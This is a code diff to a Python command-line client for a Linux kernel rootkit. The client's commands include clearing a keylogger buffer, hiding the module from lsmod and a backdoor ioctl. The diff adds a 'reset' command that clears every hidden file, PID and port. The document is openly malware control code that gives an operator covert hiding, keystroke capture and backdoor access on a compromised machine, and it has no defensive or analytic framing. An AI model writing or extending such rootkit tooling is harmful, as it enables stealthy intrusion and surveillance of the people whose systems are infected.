@@ -21,6 +21,7 @@ Commands:
     keylog-clear          Clear the keylogger buffer
     hide-module           Hide rootkit from lsmod
     unhide-module         Make rootkit visible in lsmod
+    reset                 Clear ALL hidden files, PIDs and ports
     status                Check if rootkit is loaded and show info
 """
 
@@ -66,6 +67,7 @@ IOCTL_BACKDOOR_MAGIC  = _IOW(MAGIC, 0x0C, 16)
 IOCTL_MODULE_HIDE     = _IO(MAGIC, 0x0D)
 IOCTL_MODULE_UNHIDE   = _IO(MAGIC, 0x0E)
 IOCTL_GET_STATS       = _IOR(MAGIC, 0x0F, 4096)
+IOCTL_RESET_ALL       = _IO(MAGIC, 0x10)
 
 MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/backdoor.c
 
@@ -244,6 +246,16 @@ class VaultKernelClient:
             print("[-] Permission denied. Run with sudo.")
         self._close()
 
+    def reset(self):
+        """Clear every hidden file, PID and port in one shot."""
+        self._open()
+        try:
+            fcntl.ioctl(self.fd, IOCTL_RESET_ALL)
+            print("[+] Reset: all hidden files, PIDs and ports cleared")
+        except PermissionError:
+            print("[-] Permission denied. Run with sudo.")
+        self._close()
+
     def status(self):
         """Check if rootkit is loaded."""
         if os.path.exists(DEVICE_PATH):
@@ -334,6 +346,7 @@ def main():
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
     subparsers.add_parser("unhide-module", help="Reveal in lsmod")
+    subparsers.add_parser("reset", help="Clear ALL hidden files, PIDs and ports")
 
     args = parser.parse_args()
 
@@ -381,6 +394,8 @@ def main():
             client.hide_module()
         elif args.command == "unhide-module":
             client.unhide_module()
+        elif args.command == "reset":
+            client.reset()
     except Exception as e:
         print(f"[-] Error: {e}", file=sys.stderr)
         sys.exit(1)
